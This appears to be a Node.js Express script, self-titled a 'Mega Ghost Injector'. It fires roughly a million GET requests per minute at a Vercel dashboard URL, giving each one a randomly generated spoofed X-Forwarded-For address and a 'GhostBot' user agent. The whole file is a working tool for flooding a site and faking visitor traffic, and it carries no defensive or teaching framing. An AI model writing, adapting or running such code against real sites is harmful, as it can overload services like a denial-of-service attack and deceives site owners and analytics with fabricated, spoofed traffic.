const express = require("express");
const axios = require("axios");
const app = express();

const dashboardURL = "https://shadow-dashboard-kaycee.vercel.app";
const PINGS_PER_MINUTE = 1000000;
const PINGS_PER_SECOND = Math.floor(PINGS_PER_MINUTE / 60);

function randomIP() {
  return `${rand(11, 190)}.${rand(10, 255)}.${rand(10, 255)}.${rand(10, 255)}`;
}
function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function ghostPing(fakeIP) {
  try {
    await axios.get(dashboardURL, {
      headers: {
        "X-Forwarded-For": fakeIP,
        "User-Agent": "Mozilla/5.0 (GhostBot)"
      }
    });
    console.log(`✅ Ping from ${fakeIP}`);
  } catch (err) {
    console.log(`❌ Failed from ${fakeIP}`);
  }
}

setInterval(() => {
  for (let i = 0; i < PINGS_PER_SECOND; i++) {
    const fakeIP = randomIP();
    ghostPing(fakeIP);
  }
}, 1000);

app.get("/", (req, res) => {
  res.send("👻 Mega Ghost Injector Running at 1M/minute!");
});

const listener = app.listen(process.env.PORT || 3000, () => {
  console.log("🚀 Injector running on port " + listener.address().port);
});
